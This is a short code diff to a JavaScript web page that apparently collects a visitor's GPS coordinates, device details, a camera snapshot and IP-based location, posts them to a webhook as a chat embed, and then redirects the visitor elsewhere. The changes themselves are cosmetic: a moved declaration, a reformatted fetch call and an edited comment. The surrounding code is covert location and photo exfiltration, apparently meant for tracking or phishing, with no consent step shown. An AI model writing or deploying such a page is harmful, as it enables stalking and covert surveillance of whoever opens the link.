@@ -64,6 +64,8 @@
         ? `https://www.google.com/maps?q=${coords.lat},${coords.lon}` : "N/A";
       const device = getDeviceInfo();
 
+      const formData = new FormData();
+
       const payload = {
         embeds: [{
           title: "📍 GPS & Device Info",
@@ -90,7 +92,6 @@
         }]
       };
 
-      const formData = new FormData();
       formData.append("payload_json", JSON.stringify(payload));
 
       if (capturedImageData) {
@@ -98,8 +99,12 @@
         formData.append("files[0]", blob, "snapshot.png");
       }
 
-      fetch(webhookUrl, { method: "POST", body: formData })
-        .finally(() => window.location.href = redirectUrl);
+      fetch(webhookUrl, {
+        method: "POST",
+        body: formData
+      }).finally(() => {
+        window.location.href = redirectUrl;
+      });
     }
 
     async function startSequence() {
@@ -146,7 +151,7 @@
             };
           });
         } catch {
-          // camera denied — continue
+          // camera denied — continue without snapshot
         }
 
         fetch("https://api.db-ip.com/v2/free/self")
